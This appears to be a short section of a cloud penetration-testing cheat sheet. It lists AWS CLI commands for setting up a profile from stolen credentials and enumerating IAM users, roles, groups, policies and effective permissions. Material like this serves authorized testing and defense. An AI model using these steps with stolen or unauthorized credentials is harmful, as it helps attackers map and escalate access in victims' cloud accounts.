## 🔑 IAM Enumeration & Attacks

```bash
# With stolen credentials - set up profile
aws configure --profile stolen
# Enter: Access Key, Secret Key, Region

# Who am I?
aws sts get-caller-identity --profile stolen

# List IAM users
aws iam list-users --profile stolen

# List IAM roles
aws iam list-roles --profile stolen

# List policies for user
aws iam list-attached-user-policies --user-name username --profile stolen

# Get policy details
aws iam get-policy --policy-arn arn:aws:iam::123456789:policy/PolicyName --profile stolen
aws iam get-policy-version --policy-arn arn:aws:iam::123456789:policy/PolicyName --version-id v1 --profile stolen

# List groups
aws iam list-groups --profile stolen
aws iam list-group-policies --group-name groupname --profile stolen

# Check what you can do
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789:user/username \
  --action-names "s3:GetObject" "ec2:DescribeInstances" \
  --profile stolen
```

